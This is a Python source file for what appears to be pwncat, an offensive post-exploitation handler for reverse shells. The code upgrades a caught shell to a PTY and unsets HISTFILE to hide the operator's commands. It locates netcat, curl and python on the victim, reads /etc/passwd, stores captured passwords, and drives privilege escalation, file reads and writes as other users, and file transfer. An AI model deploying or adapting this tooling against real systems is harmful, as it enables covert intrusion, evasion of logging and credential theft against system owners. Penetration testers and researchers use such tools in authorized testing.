#!/usr/bin/env python3
from typing import Dict, Optional, Iterable
from prompt_toolkit import PromptSession, ANSI
from prompt_toolkit.shortcuts import ProgressBar
from prompt_toolkit.completion import (
    Completer,
    PathCompleter,
    Completion,
    CompleteEvent,
    NestedCompleter,
    WordCompleter,
    merge_completers,
)
from prompt_toolkit.document import Document
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.lexers import PygmentsLexer
import subprocess
import logging
import argparse
import base64
import time
import socket
import enum
import shlex
import sys
import os

from pwncat import util
from pwncat import downloader, uploader, privesc
from pwncat.file import RemoteBinaryPipe
from pwncat.lexer import LocalCommandLexer, PwncatStyle

from colorama import Fore


class State(enum.Enum):
    """ The current PtyHandler state """

    NORMAL = enum.auto()
    RAW = enum.auto()
    COMMAND = enum.auto()


def with_parser(f):
    def _decorator(self, argv):
        try:
            parser = getattr(self, f.__name__.split("do_")[1] + "_parser")
            args = parser.parse_args(argv)
        except SystemExit:
            return
        return f(self, args)

    return _decorator


class RemotePathCompleter(Completer):
    def __init__(self, pty: "PtyHandler"):
        self.pty = pty

    def get_completions(self, document: Document, complete_event: CompleteEvent):

        before = document.text_before_cursor.split()[-1]
        path, partial_name = os.path.split(before)

        if path == "":
            path = "."

        delim = self.pty.process(f"ls -1 -a {shlex.quote(path)}", delim=True)

        name = self.pty.recvuntil(b"\n").strip()
        while name != delim:
            name = name.decode("utf-8")
            if name.startswith(partial_name):
                yield Completion(
                    name,
                    start_position=-len(partial_name),
                    display=[("#ff0000", "(remote)"), ("", f" {name}")],
                )
            name = self.pty.recvuntil(b"\n").strip()


class LocalPathCompleter(Completer):
    def __init__(self, pty: "PtyHandler"):
        self.pty = pty

    def get_completions(self, document: Document, complete_event: CompleteEvent):

        before = document.text_before_cursor.split()[-1]
        path, partial_name = os.path.split(before)

        if path == "":
            path = "."

        # Ensure the directory exists
        if not os.path.isdir(path):
            return

        for name in os.listdir(path):
            if name.startswith(partial_name):
                yield Completion(
                    name,
                    start_position=-len(partial_name),
                    display=[("fg:ansiyellow", "(local)"), ("", f" {name}")],
                )


class CommandCompleter(Completer):
    def __init__(self, description):
        self.description = description

    def get_completions(
        self, document: Document, complete_event: CompleteEvent
    ) -> Iterable[Completion]:
        # Split document.
        text = document.text_before_cursor.lstrip()
        stripped_len = len(document.text_before_cursor) - len(text)

        # If there is a space, check for the first term, and use a
        # subcompleter.
        if " " in text:
            first_term = text.split()[0]
            command = self.description.get(first_term)

            # If we have a sub completer, use this for the completions.
            if command is not None:
                options = [k for k in command if k != "positional"]
                terms = text.split(" ")

                if len(terms) > 2:
                    prev_term = terms[-2]
                else:
                    prev_term = None

                if prev_term in options:
                    completer = command[prev_term]
                else:
                    positionals = command.get("positional", [])
                    completer = merge_completers(
                        [WordCompleter(options, ignore_case=False)] + positionals
                    )

                for c in completer.get_completions(document, complete_event):
                    yield c

        # No space in the input: behave exactly like `WordCompleter`.
        else:
            completer = WordCompleter(list(self.description.keys()), ignore_case=False)
            for c in completer.get_completions(document, complete_event):
                yield c


class PtyHandler:
    """ Handles creating the pty on the remote end and locally processing input
    on the local end """

    OPEN_METHODS = {
        "script": "exec {} -qc {} /dev/null 2>&1",
        "python": "exec {} -c \"import pty; pty.spawn('{}')\" 2>&1",
    }

    INTERESTING_BINARIES = [
        "python",
        "python2",
        "python3",
        "perl",
        "bash",
        "dash",
        "zsh",
        "sh",
        "curl",
        "wget",
        "nc",
        "netcat",
        "ncat",
        "script",
    ]

    def __init__(self, client: socket.SocketType):
        """ Initialize a new Pty Handler. This will handle creating the PTY and
        setting the local terminal to raw. It also maintains the state to open a
        local terminal if requested and exit raw mode. """

        self.client = client
        self.state = "normal"
        self.saved_term_state = None
        self.input = b""
        self.lhost = None
        self.known_binaries = {}
        self.known_users = {}
        self.vars = {"lhost": util.get_ip_addr()}
        self.remote_prefix = "\\[\\033[01;31m\\](remote)\\033[00m\\]"
        self.remote_prompt = "\\[\\033[01;33m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;36m\\]\\w\\[\\033[00m\\]\\$ "
        self.prompt = self.build_prompt_session()
        self.binary_aliases = {
            "python": [
                "python2",
                "python3",
                "python2.7",
                "python3.6",
                "python3.8",
                "python3.9",
            ],
            "sh": ["bash", "zsh", "dash"],
            "nc": ["netcat", "ncat"],
        }

        # Setup the argument parsers for local the local prompt
        self.setup_command_parsers()

        # We should always get a response within 3 seconds...
        self.client.settimeout(1)

        util.info("probing for prompt...", overlay=True)
        start = time.time()
        prompt = b""
        try:
            while time.time() < (start + 0.1):
                prompt += self.client.recv(1)
        except socket.timeout:
            pass

        # We assume if we got data before sending data, there is a prompt
        if prompt != b"":
            self.has_prompt = True
            util.info(f"found a prompt", overlay=True)
        else:
            self.has_prompt = False
            util.info("no prompt observed", overlay=True)

        # Send commands without a new line, and see if the characters are echoed
        util.info("checking for echoing", overlay=True)
        test_cmd = b"echo"
        self.client.send(test_cmd)
        response = b""

        try:
            while len(response) < len(test_cmd):
                response += self.client.recv(len(test_cmd) - len(response))
        except socket.timeout:
            pass

        if response == test_cmd:
            self.has_echo = True
            util.info("found input echo", overlay=True)
        else:
            self.has_echo = False
            util.info(f"no echo observed", overlay=True)

        self.client.send(b"\n")
        response = self.client.recv(1)
        if response == "\r":
            self.client.recv(1)
            self.has_cr = True
        else:
            self.has_cr = False

        if self.has_echo:
            self.recvuntil(b"\n")

        # Ensure history is disabled
        util.info("disabling remote command history", overlay=True)
        self.run("unset HISTFILE; export HISTCONTROL=ignorespace")

        util.info("setting terminal prompt", overlay=True)
        self.run("unset PROMPT_COMMAND")
        self.run(f'export PS1="{self.remote_prefix} {self.remote_prompt}"')

        self.shell = self.run("ps -o command -p $$ | tail -n 1").decode("utf-8").strip()
        self.shell = self.which(self.shell.split(" ")[0])
        util.info(f"running in {Fore.BLUE}{self.shell}{Fore.RESET}")

        # Locate interesting binaries
        # The auto-resolving doesn't work correctly until we have a pty
        # so, we manually resolve a list of useful binaries prior to spawning
        # a pty
        for name in PtyHandler.INTERESTING_BINARIES:
            util.info(
                f"resolving remote binary: {Fore.YELLOW}{name}{Fore.RESET}",
                overlay=True,
            )

            # Look for the given binary
            response = self.run(f"which {shlex.quote(name)}").strip()
            if response == b"":
                continue

            self.known_binaries[name] = response.decode("utf-8")

        # Now, we can resolve using `which` w/ request=False for the different
        # methods
        for m, cmd in PtyHandler.OPEN_METHODS.items():
            if self.which(m, request=False) is not None:
                method_cmd = cmd.format(self.which(m, request=False), self.shell)
                method = m
                break
        else:
            util.error("no available methods to spawn a pty!")
            raise RuntimeError("no available methods to spawn a pty!")

        # Open the PTY
        util.info(
            f"opening pseudoterminal via {Fore.GREEN}{method}{Fore.RESET}", overlay=True
        )
        self.run(method_cmd, wait=False)
        # client.sendall(method_cmd.encode("utf-8") + b"\n")

        # We just started a PTY, so we now have all three
        self.has_echo = True
        self.has_cr = True
        self.has_prompt = True

        util.info("setting terminal prompt", overlay=True)
        self.run("unset PROMPT_COMMAND")
        self.run(f'export PS1="{self.remote_prefix} {self.remote_prompt}"')

        # Make sure HISTFILE is unset in this PTY (it resets when a pty is
        # opened)
        self.run("unset HISTFILE; export HISTCONTROL=ignorespace")

        # Disable automatic margins, which fuck up the prompt
        self.run("tput rmam")

        # Synchronize the terminals
        util.info("synchronizing terminal state", overlay=True)
        self.do_sync([])

        self.privesc = privesc.Finder(self)

        # Force the local TTY to enter raw mode
        self.enter_raw()

    def build_prompt_session(self):
        """ This is kind of gross because of the nested completer, so I broke
        it out on it's own. The nested completer must be updated separately
        whenever a new command or a command argument is changed. """

        remote_completer = RemotePathCompleter(self)
        local_completer = LocalPathCompleter(self)
        download_method_completer = WordCompleter(downloader.get_names())
        upload_method_completer = WordCompleter(uploader.get_names())

        completer_graph = {
            "download": {
                "-m": download_method_completer,
                "--method": download_method_completer,
                "-o": local_completer,
                "--output": local_completer,
                "positional": [remote_completer],
            },
            "upload": {
                "-m": upload_method_completer,
                "--method": upload_method_completer,
                "-o": remote_completer,
                "--output": remote_completer,
                "positional": [local_completer],
            },
            "back": None,
            "sync": None,
            "help": None,
        }

        return PromptSession(
            [
                ("fg:ansiyellow bold", "(local) "),
                ("fg:ansimagenta bold", "pwncat"),
                ("", "$ "),
            ],
            completer=CommandCompleter(completer_graph),
            auto_suggest=AutoSuggestFromHistory(),
            lexer=PygmentsLexer(LocalCommandLexer),
            style=PwncatStyle,
        )

    def which(self, name: str, request=True) -> str:
        """ Call which on the remote host and return the path. The results are
        cached to decrease the number of remote calls. """
        path = None

        if name in self.known_binaries and self.known_binaries[name] is not None:
            # Cached value available
            path = self.known_binaries[name]
        elif name not in self.known_binaries and request:
            # It hasn't been looked up before, request it.
            path = self.run(f"which {shlex.quote(name)}").decode("utf-8").strip()
            if path == "":
                path = None

        if name in self.binary_aliases and path is None:
            # Look for aliases of this command as a last resort
            for alias in self.binary_aliases[name]:
                path = self.which(alias)
                if path is not None:
                    break

        # Cache the value
        self.known_binaries[name] = path

        return path

    def process_input(self, data: bytes):
        r""" Process a new byte of input from stdin. This is to catch "\r~C" and open
        a local prompt """

        # Send the new data to the client
        self.client.send(data)

        # Only process data following a new line
        if data == b"\r":
            self.input = data
        elif len(data) == 0:
            return
        else:
            self.input += data

        if self.input == b"\r~C":
            # Erase the current line on the remote host ("~C")
            # This is 2 backspace characters
            self.client.send(b"\x08" * 2 + b"\r")
            # Start processing local commands
            self.enter_command()
        elif len(self.input) >= 3:
            # Our only escapes are 3 characters (include the newline)
            self.input = b""

    def recv(self) -> bytes:
        """ Recieve data from the client """
        return self.client.recv(4096)

    def enter_raw(self, save: bool = True):
        """ Enter raw mode on the local terminal """
        old_term_state = util.enter_raw_mode()

        self.state = State.RAW

        # Save the state if requested
        if save:
            self.saved_term_state = old_term_state

    def enter_command(self):
        """ Enter commmand mode. This sets normal mode and uses prompt toolkit
        process commands from the user for the local machine """

        # Go back to normal mode
        self.restore()
        self.state = State.COMMAND

        # Hopefully this fixes weird cursor position issues
        sys.stdout.write("\n")

        # Process commands
        while self.state is State.COMMAND:
            try:
                try:
                    line = self.prompt.prompt()
                except (EOFError, OSError):
                    # The user pressed ctrl-d, go back
                    self.enter_raw()
                    continue

                if len(line) > 0:
                    if line[0] == "!":
                        # Allow running shell commands
                        subprocess.run(line[1:], shell=True)
                        continue
                    elif line[0] == "@":
                        result = self.run(line[1:])
                        sys.stdout.buffer.write(result)
                        continue
                    elif line[0] == "-":
                        self.run(line[1:], wait=False)
                        continue

                argv = shlex.split(line)

                # Empty command
                if len(argv) == 0:
                    continue

                try:
                    method = getattr(self, f"do_{argv[0]}")
                except AttributeError:
                    util.warn(f"{argv[0]}: command does not exist")
                    continue

                # Call the method
                method(argv[1:])
            except KeyboardInterrupt:
                continue

    @with_parser
    def do_back(self, _):
        """ Exit command mode """
        self.enter_raw(save=False)

    def do_privesc(self, argv):
        """ Attempt privilege escalation """

        parser = argparse.ArgumentParser(prog="privesc")
        parser.add_argument(
            "--list",
            "-l",
            action="store_true",
            help="do not perform escalation. list potential escalation methods",
        )
        parser.add_argument(
            "--all",
            "-a",
            action="store_const",
            dest="user",
            const=None,
            help="when listing methods, list for all users. when escalating, escalate to root.",
        )
        parser.add_argument(
            "--user",
            "-u",
            choices=[user for user in self.users],
            default="root",
            help="the target user",
        )
        parser.add_argument(
            "--max-depth",
            "-m",
            type=int,
            default=None,
            help="Maximum depth for the privesc search (default: no maximum)",
        )
        parser.add_argument(
            "--read",
            "-r",
            type=str,
            default=None,
            help="remote filename to try and read",
        )
        parser.add_argument(
            "--write",
            "-w",
            type=str,
            default=None,
            help="attempt to write to a remote file as the specified user",
        )
        parser.add_argument(
            "--data",
            "-d",
            type=str,
            default=None,
            help="the data to write a file. ignored if not write mode",
        )
        parser.add_argument(
            "--text",
            "-t",
            action="store_true",
            default=False,
            help="whether to use safe readers/writers",
        )

        try:
            args = parser.parse_args(argv)
        except SystemExit:
            # The arguments were parsed incorrectly, return.
            return

        if args.list:
            techniques = self.privesc.search(args.user)
            if len(techniques) == 0:
                util.warn("no techniques found")
            else:
                for tech in techniques:
                    util.info(f" - {tech}")
        elif args.read:
            try:
                read_pipe, chain = self.privesc.read_file(
                    args.read, args.user, args.max_depth
                )

                # Read the data from the pipe
                sys.stdout.buffer.write(read_pipe.read(4096))
                read_pipe.close()

                # Unwrap in case we had to privesc to get here
                self.privesc.unwrap(chain)

            except privesc.PrivescError as exc:
                util.error(f"read file failed: {exc}")
        elif args.write:
            if args.data is None:
                util.error("no data specified")
            else:
                if args.data.startswith("@"):
                    with open(args.data[1:], "rb") as f:
                        data = f.read()
                else:
                    data = args.data.encode("utf-8")
                try:
                    chain = self.privesc.write_file(
                        args.write,
                        data,
                        safe=not args.text,
                        target_user=args.user,
                        depth=args.max_depth,
                    )
                    self.privesc.unwrap(chain)
                    util.success("file written successfully!")
                except privesc.PrivescError as exc:
                    util.error(f"file write failed: {exc}")
        else:
            try:
                self.privesc.escalate(args.user, args.max_depth)
            except privesc.PrivescError as exc:
                util.error(f"escalation failed: {exc}")

    @with_parser
    def do_download(self, args):
        """ Download a file from the remote host """

        try:
            # Locate an appropriate downloader class
            DownloaderClass = downloader.find(self, args.method)
        except downloader.DownloadError as exc:
            util.error(f"{exc}")
            return

        # Grab the arguments
        path = args.path
        basename = os.path.basename(args.path)
        outfile = args.output.format(basename=basename)

        download = DownloaderClass(self, remote_path=path, local_path=outfile)

        # Get the remote file size
        size = self.run(f'stat -c "%s" {shlex.quote(path)} 2>/dev/null || echo "none"')
        if b"none" in size:
            util.error(f"{path}: no such file or directory")
            return
        size = int(size)

        with ProgressBar(
            [("#888888", "downloading with "), ("fg:ansiyellow", f"{download.NAME}")]
        ) as pb:
            counter = pb(range(size))
            last_update = time.time()

            def on_progress(copied, blocksz):
                """ Update the progress bar """
                if blocksz == -1:
                    counter.stopped = True
                    counter.done = True
                    pb.invalidate()
                    return

                counter.items_completed += blocksz
                if counter.items_completed >= counter.total:
                    counter.done = True
                    counter.stopped = True
                if (time.time() - last_update) > 0.1:
                    pb.invalidate()

            try:
                download.serve(on_progress)
                if download.command():
                    while not counter.done:
                        time.sleep(0.2)
            finally:
                download.shutdown()

            # https://github.com/prompt-toolkit/python-prompt-toolkit/issues/964
            time.sleep(0.1)

    @with_parser
    def do_upload(self, args):
        """ Upload a file to the remote host """

        if not os.path.isfile(args.path):
            util.error(f"{args.path}: no such file or directory")
            return

        try:
            # Locate an appropriate downloader class
            UploaderClass = uploader.find(self, args.method)
        except uploader.UploadError as exc:
            util.error(f"{exc}")
            return

        path = args.path
        basename = os.path.basename(args.path)
        name = basename
        outfile = args.output.format(basename=basename)

        upload = UploaderClass(self, remote_path=outfile, local_path=path)

        with ProgressBar(
            [("#888888", "uploading via "), ("fg:ansiyellow", f"{upload.NAME}")]
        ) as pb:

            counter = pb(range(os.path.getsize(path)))
            last_update = time.time()

            def on_progress(copied, blocksz):
                """ Update the progress bar """
                counter.items_completed += blocksz
                if counter.items_completed >= counter.total:
                    counter.done = True
                    counter.stopped = True
                if (time.time() - last_update) > 0.1:
                    pb.invalidate()

            upload.serve(on_progress)
            upload.command()

            try:
                while not counter.done:
                    time.sleep(0.1)
            except KeyboardInterrupt:
                pass
            finally:
                upload.shutdown()

            # https://github.com/prompt-toolkit/python-prompt-toolkit/issues/964
            time.sleep(0.1)

    def do_sync(self, argv):
        """ Synchronize the remote PTY with the local terminal settings """

        TERM = os.environ.get("TERM", "xterm")
        columns, rows = os.get_terminal_size(0)

        self.run(f"stty rows {rows}; stty columns {columns}; export TERM='{TERM}'")

    def do_set(self, argv):
        """ Set or view the currently assigned variables """

        if len(argv) == 0:
            util.info("local variables:")
            for k, v in self.vars.items():
                print(f" {k} = {shlex.quote(v)}")

            util.info("user passwords:")
            for user, data in self.users.items():
                if data["password"] is not None:
                    print(
                        f" {Fore.GREEN}{user}{Fore.RESET} -> {Fore.CYAN}{shlex.quote(data['password'])}{Fore.RESET}"
                    )
            return

        parser = argparse.ArgumentParser(prog="set")
        parser.add_argument(
            "--password",
            "-p",
            action="store_true",
            help="set the password for the given user",
        )
        parser.add_argument("variable", help="the variable name or user")
        parser.add_argument("value", help="the new variable/user password value")

        try:
            args = parser.parse_args(argv)
        except SystemExit:
            # The arguments were parsed incorrectly, return.
            return

        if args.password is not None and args.variable not in self.users:
            util.error(f"{args.variable}: no such user")
        elif args.password is not None:
            self.users[args.variable]["password"] = args.value
        else:
            self.vars[args.variable] = args.value

    def do_help(self, argv):
        """ View help for local commands """

        if len(argv) == 0:
            commands = [x for x in dir(self) if x.startswith("do_")]
        else:
            commands = [x for x in dir(self) if x.startswith("do_") and x[3:] in argv]

        for c in commands:
            help_msg = getattr(self, c).__doc__
            print(f"{c[3:]:15s}{help_msg}")

    def do_reset(self, argv):
        """ Reset the remote terminal (calls sync, reset, and sets PS1) """
        self.reset()
        self.do_sync([])

    def run(self, cmd, wait=True) -> bytes:
        """ Run a command in the context of the remote host and return the
        output. This is run synchrounously.

            :param cmd: The command to run. Either a string or an argv list.
            :param has_pty: Whether a pty was spawned
        """

        response = self.process(cmd, delim=wait)

        if wait:

            response = self.recvuntil(b"_PWNCAT_ENDDELIM_")
            response = response.split(b"_PWNCAT_ENDDELIM_")[0]
            if b"_PWNCAT_STARTDELIM_" in response:
                response = b"\n".join(response.split(b"\n")[1:])

            if self.has_cr:
                self.recvuntil(b"\r\n")
            else:
                self.recvuntil(b"\n")

        return response

    def process(self, cmd, delim=True) -> bytes:
        """ Run a command in the context of the remote host and return the
        output. This is run synchrounously.

            :param cmd: The command to run. Either a string or an argv list.
            :param has_pty: Whether a pty was spawned
        """

        if isinstance(cmd, list):
            cmd = shlex.join(cmd)

        if delim:
            command = f" echo _PWNCAT_STARTDELIM_; {cmd}; echo _PWNCAT_ENDDELIM_"
        else:
            command = f" {cmd}"

        response = b""

        # Send the command to the remote host
        self.client.send(command.encode("utf-8") + b"\n")

        if delim:
            if self.has_echo:
                # Recieve line ending from output
                self.recvuntil(b"_PWNCAT_STARTDELIM_")
                self.recvuntil(b"\n", interp=True)

            self.recvuntil(b"_PWNCAT_STARTDELIM_", interp=True)  # first in output
            self.recvuntil(b"\n", interp=True)

        return b"_PWNCAT_ENDDELIM_"

    def subprocess(self, cmd) -> RemoteBinaryPipe:
        """ Create an asynchronous child on the remote end and return a
        file-like object which can communicate with it's standard output. The 
        remote terminal is placed in raw mode with no-echo first, and the
        command is run on a separate background shell w/ no standard input. The
        output of the command can be retrieved through the returned file-like
        object. You **must** either call `close()` of the pipe, or read until
        eof, or the PTY will not be restored to a normal state.

        If `close()` is called prior to EOF, the remote process will be killed,
        and any remaining output will be flushed prior to resetting the terminal.
        """

        if isinstance(cmd, list):
            cmd = shlex.join(cmd)

        sdelim = "_PWNCAT_STARTDELIM_"
        edelim = "_PWNCAT_ENDDELIM_"

        # List of ";" separated commands that will be run
        command = []
        # Clear the prompt, or it will get displayed in our output due to the
        # background task
        command.append("export PS1=")
        # Needed to disable job control messages in bash
        command.append("set +m")
        # This is gross, but it allows us to recieve stderr and stdout, while
        # ignoring the job control start message.
        command.append(
            f"{{ echo {sdelim}; {cmd} && echo {edelim} || echo {edelim} 2>&1 & }} 2>/dev/null"
        )
        # Re-enable normal job control in bash
        command.append("set -m")

        # Join them all into one command
        command = ";".join(command).encode("utf-8")

        # Enter raw mode w/ no echo on the remote terminal
        # DANGER
        self.raw(echo=False)

        self.client.sendall(command + b"\n")
        self.recvuntil(sdelim)
        self.recvuntil("\n")

        return RemoteBinaryPipe(self, edelim.encode("utf-8"), True)

    def raw(self, echo: bool = False):
        self.run("stty raw -echo", wait=False)
        self.has_cr = False
        self.has_echo = False

    def reset(self):
        self.run("reset", wait=False)
        self.has_cr = True
        self.has_echo = True
        self.run(f"export PS1='{self.remote_prefix} {self.remote_prompt}'")
        self.run(f"tput rmam")

    def recvuntil(self, needle: bytes, flags=0, interp=False):
        """ Recieve data from the client until the specified string appears """

        if isinstance(needle, str):
            needle = needle.encode("utf-8")

        result = b""
        while not result.endswith(needle):
            try:
                data = self.client.recv(1, flags)
                # Bash sends some **WEIRD** shit and wraps it in backspace
                # characters for some reason. When asked, we interpret the
                # backspace characters so the response is what we expect.
                if interp and data == b"\x08":
                    if len(result) > 0:
                        result = result[:-1]
                else:
                    result += data
            except socket.timeout:
                continue  # force waiting

        return result

    def restore(self):
        """ Restore the terminal state """
        util.restore_terminal(self.saved_term_state)
        self.state = State.NORMAL

    def setup_command_parsers(self):
        """ Setup the argparsers for the different local commands """

        self.upload_parser = argparse.ArgumentParser(prog="upload")
        self.upload_parser.add_argument(
            "--method",
            "-m",
            choices=uploader.get_names(),
            default=None,
            help="set the download method (default: auto)",
        )
        self.upload_parser.add_argument(
            "--output",
            "-o",
            default="./{basename}",
            help="path to the output file (default: basename of input)",
        )
        self.upload_parser.add_argument("path", help="path to the file to upload")

        self.download_parser = argparse.ArgumentParser(prog="download")
        self.download_parser.add_argument(
            "--method",
            "-m",
            choices=downloader.get_names(),
            default=None,
            help="set the download method (default: auto)",
        )
        self.download_parser.add_argument(
            "--output",
            "-o",
            default="./{basename}",
            help="path to the output file (default: basename of input)",
        )
        self.download_parser.add_argument("path", help="path to the file to download")

        self.back_parser = argparse.ArgumentParser(prog="back")

    def whoami(self):
        result = self.run("whoami")
        return result.strip().decode("utf-8")

    def reload_users(self):
        """ Clear user cache and reload it """
        self.known_users = None
        return self.users

    @property
    def users(self):
        if self.known_users:
            return self.known_users

        self.known_users = {}

        passwd = self.run("cat /etc/passwd").decode("utf-8")
        for line in passwd.split("\n"):
            line = line.strip()
            if line == "":
                continue
            line = line.strip().split(":")

            user_data = {
                "name": line[0],
                "password": None,
                "uid": int(line[2]),
                "gid": int(line[3]),
                "description": line[4],
                "home": line[5],
                "shell": line[6],
            }
            self.known_users[line[0]] = user_data

        return self.known_users

    @property
    def current_user(self):
        name = self.whoami()
        if name in self.users:
            return self.users[name]
        return None
